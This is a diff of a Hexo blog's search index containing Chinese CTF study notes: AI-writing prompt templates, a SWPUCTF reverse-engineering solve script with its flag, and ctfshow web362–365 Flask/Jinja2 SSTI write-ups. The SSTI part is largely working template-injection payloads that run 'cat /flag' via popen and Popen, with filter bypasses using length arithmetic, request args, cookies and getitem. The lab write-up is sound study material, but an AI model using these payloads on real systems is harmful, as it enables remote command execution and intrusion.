@@ -1,6 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>让AI写作业的尝试</title>
+    <url>/2025/03/02/%E8%AE%A9AI%E5%86%99%E4%BD%9C%E4%B8%9A%E7%9A%84%E5%B0%9D%E8%AF%95/</url>
+    <content><![CDATA[<p>改进提示词： “请用以下规范输出： 1.语言平实直述，避免抽象隐喻； 2.使用日常场景化案例辅助说明； 3.优先选择具体名词替代抽象概念； 4.保持段落简明（不超过5行）； 5.技术表述需附通俗解释； 6.禁用文学化修辞； 7.重点信息前置； 8.复杂内容分点说明； 9.保持口语化但不过度简化专业内容； 10.确保信息准确前提下优先选择大众认知词汇。”</p>
+<p>请用以下规范输出： 1.语言平实直述，避免抽象隐喻； 2.使用日常场景化案例辅助说明； 3.优先选择具体名词替代抽象概念； 4.保持段落简明（不超过5行）； 5.技术表述需附通俗解释； 6.禁用文学化修辞； 7.重点信息前置； 8.复杂内容分点说明； 9.保持口语化但不过度简化专业内容； 10.确保信息准确前提下优先选择大众认知词汇。 总是专注于我的问题的关键点，以确定我的意图。将复杂的问题或任务分解为较小、可管理的步骤，并使用推理解释每一个步骤。提供多种观点或解决方案。如果问题不清楚或模棱两可，请先询问更多细节以确认你的理解，然后再回答。引用可信的来源或参考来支持你的回答，如果可以，请提供链接。如果之前的回应中出现错误，要承认并纠正它。在回答后，提供三个继续探讨原始主题的问题，格式为Q1、Q2和Q3，并用粗体表示。在每个问题前后分别加上两行换行符（”\n”）以作间隔。这些问题应该具有启发性，进一步深入探讨原始主题。</p>
+<p>将所有的句子过渡词和连接词替换为最基 础、最常用的词语。尽量使用简单、直接的 表达方式，避免使用复杂或生僻的词汇。确 保句子之间的逻辑关系清晰。删掉文末总结 的部分 </p>
+<p>将以上文字重新修改，写作风格界于书面学 术写作和口语描述之间。保证所有的句子都 要有主语，不要用复杂的长难句，尽量用短 句输出。替换掉所有的非日常词汇。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>SQL注入学习总结</title>
+    <url>/2025/03/02/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>[SWPUCTF 2021 新生赛]简简单单的逻辑</title>
     <url>/2025/03/02/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-%E7%AE%80%E7%AE%80%E5%8D%95%E5%8D%95%E7%9A%84%E9%80%BB%E8%BE%91/</url>
     <content><![CDATA[<p>因为主播本人没什么CS知识全靠DS所以小记一下</p>
@@ -10,6 +24,17 @@
 
 <p>代码中，key的计算方式是：将list中的每个元素右移4位，然后加上该元素与0xf（即二进制的1111）进行按位与操作后的结果左移4位。这可能等同于交换该字节的高四位和低四位。</p>
 <p>比如，如果一个字节是0xab（二进制10101011），右移4位得到0x0a，而低四位是0x0b，左移4位得到0xb0。相加就是0xba。所以这个过程实际上是将原字节的高四位和低四位交换位置。</p>
+<p>搬运的exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = <span class="string">&#x27;bcfba4d0038d48bd4b00f82796d393dfec&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">47</span>, <span class="number">138</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">143</span>, <span class="number">17</span>, <span class="number">84</span>, <span class="number">42</span>, <span class="number">135</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">28</span>, <span class="number">169</span>, <span class="number">25</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    key = (<span class="built_in">list</span>[i] &gt;&gt; <span class="number">4</span>) + ((<span class="built_in">list</span>[i] &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(result[<span class="number">2</span> * i:<span class="number">2</span> * i + <span class="number">2</span>], <span class="number">16</span>) ^ key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;EZEZ_RERE&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
 <table>
 <thead>
 <tr>
@@ -200,9 +225,46 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure>
 
 <p>这段哪来的不要问我，我还没学明白</p>
-<h1 id="ctfshow-web362"><a href="#ctfshow-web362" class="headerlink" title="ctfshow web362"></a>ctfshow web362</h1><p>过滤了数字2,3等</p>
+<h1 id="过滤数字-web362"><a href="#过滤数字-web362" class="headerlink" title="过滤数字 web362"></a>过滤数字 web362</h1><p>过滤了数字2,3等</p>
 <h2 id="数字型绕过"><a href="#数字型绕过" class="headerlink" title="数字型绕过"></a>数字型绕过</h2><p>132&#x3D;140-8&#x3D;114%2b18&#x3D;11*11%2b+11（+号在url中＝空格所以写成%2b）</p>
-<h2 id="用其他的类"><a href="#用其他的类" class="headerlink" title="用其他的类"></a>用其他的类</h2><h3 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a>subprocess.Popen()</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">经过测试过滤了数字使用&#123;% set num=&#x27;aaaaaaaaaa&#x27;|length*&#x27;aaaaaaaaaaaaaa&#x27;|length-&#x27;aaaaaaaa&#x27;|length %&#125; 让num=132，从而实现绕过 payload： name=&#123;% set num=&#x27;aaaaaaaaaa&#x27;|length*&#x27;aaaaaaaaaaaaaa&#x27;|length-&#x27;aaaaaaaa&#x27;|length %&#125;&#123;&#123;().class.base.subclasses()[num].init.globals[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个 <strong>纯字符计算数值</strong> 的技巧，目的是绕过 <strong>数字过滤</strong>。我们来拆解它的计算过程：</p>
+<ul>
+<li><code>&#39;aaaaaaaaaa&#39;|length</code> &#x3D; 10（因为 <code>&#39;aaaaaaaaaa&#39;</code> 有 10 个字符）</li>
+<li><code>&#39;aaaaaaaaaaaaaa&#39;|length</code> &#x3D; 14（因为 <code>&#39;aaaaaaaaaaaaaa&#39;</code> 有 14 个字符）</li>
+<li><code>&#39;aaaaaaaa&#39;|length</code> &#x3D; 8（因为 <code>&#39;aaaaaaaa&#39;</code> 有 8 个字符）</li>
+</ul>
+<p>计算：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python复制编辑num = 10 * 14 - 8</span><br><span class="line">    = 140 - 8</span><br><span class="line">    = 132</span><br></pre></td></tr></table></figure>
+
+<h2 id="用其他的类"><a href="#用其他的类" class="headerlink" title="用其他的类"></a>用其他的类</h2><h3 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a>subprocess.Popen()</h3><h3 id="frozen-importlib-external-FileLoader"><a href="#frozen-importlib-external-FileLoader" class="headerlink" title="_frozen_importlib_external.FileLoader"></a>_frozen_importlib_external.FileLoader</h3><p>没懂</p>
+<h3 id="lipsum（flask）"><a href="#lipsum（flask）" class="headerlink" title="lipsum（flask）"></a>lipsum（flask）</h3><p>使用 lipsum 方法。这个是 flask 的内置方法，自带 os 模块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__.get(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a>builtins</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.class.base.subclasses()[104].init.globals[&#x27;__builtins__&#x27;]&#x27;eval&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="过滤单双引号-web363"><a href="#过滤单双引号-web363" class="headerlink" title="过滤单双引号 web363"></a>过滤单双引号 web363</h1><p>过滤单双引号，考虑使用get传参绕过</p>
+<p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.popen](request.args.param).read()&#125;&#125;&amp;popen=popen&amp;param=cat+/flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">132</span>].__init__.__globals__[request.args.a](request.args.b).<span class="title function_ invoke__">read</span>()&#125;&#125;&amp;a=popen&amp;b=cat /flag</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="过滤引号-args-web364"><a href="#过滤引号-args-web364" class="headerlink" title="过滤引号+args web364"></a>过滤引号+args web364</h1><p>过滤args，可以用cookies</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.cookies.p](request.cookies.param).read()&#125;&#125;`</span><br><span class="line">cookies</span><br><span class="line"></span><br><span class="line">`Cookie: p=popen; param=cat /flag`</span><br></pre></td></tr></table></figure>
+
+<h1 id="过滤-web365"><a href="#过滤-web365" class="headerlink" title="过滤[] web365"></a>过滤[] web365</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三种方法，但都需要用到python魔术方法getitem</span><br><span class="line"></span><br><span class="line">方法一： &#123;%set char=config.**class**.**init**.**globals**.**builtins**.chr%&#125;&#123;&#123;().**class**.**base**.**subclasses**().**getitem**(132).**init**.**globals**.popen(char(108)%2bchar(115)).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">方法二： name=&#123;&#123;().class.base.subclasses().getitem(132).init.globals.getitem(request.cookies.x1)(request.cookies.x2).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">然后将cookie写入 Cookie: x1=popen; x2=cat /flag</span><br><span class="line"></span><br><span class="line">方法三： 使用subprocess.Popen类 &#123;&#123;().**class**.**mro**.**getitem**(1).**subclasses**().**getitem**(407)(request.values.a,shell=True,stdout=-1).communicate().**getitem**(0)&#125;&#125;&amp;a=cat /flag</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><a href="https://drinkflower.asia/wordpress/archives/441">严格过滤下的SSTI注入</a></p>
+]]></content>
       <categories>
         <category>Web</category>
       </categories>
@@ -1241,8 +1303,8 @@
         <category>Web</category>
       </categories>
       <tags>
-        <tag>SQL注入</tag>
         <tag>反序列化</tag>
+        <tag>SQL注入</tag>
         <tag>PHP伪协议</tag>
       </tags>
   </entry>
